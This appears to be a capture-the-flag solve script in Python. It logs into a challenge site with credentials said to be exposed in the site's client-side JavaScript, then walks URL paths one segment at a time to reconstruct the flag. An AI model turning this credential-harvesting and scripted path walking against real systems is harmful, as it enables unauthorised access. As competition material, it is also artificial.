import requests

sess = requests.Session()
url = "https://jawt.sdc.tf/"

# find username and password from /js/login.js
def login():
	sess.post(url + "login", data={"username":"AzureDiamond", "password":"hunter2"})

def get_next_dir():
	resp = sess.get(url + flag)
	return resp.text


next_dir = "s"
flag = next_dir
while next_dir != '}':
	next_dir = get_next_dir()
	if "Access" in next_dir:
		login()
		next_dir = get_next_dir()
		
	flag += "/" + next_dir
	print(flag.replace("/", ""))
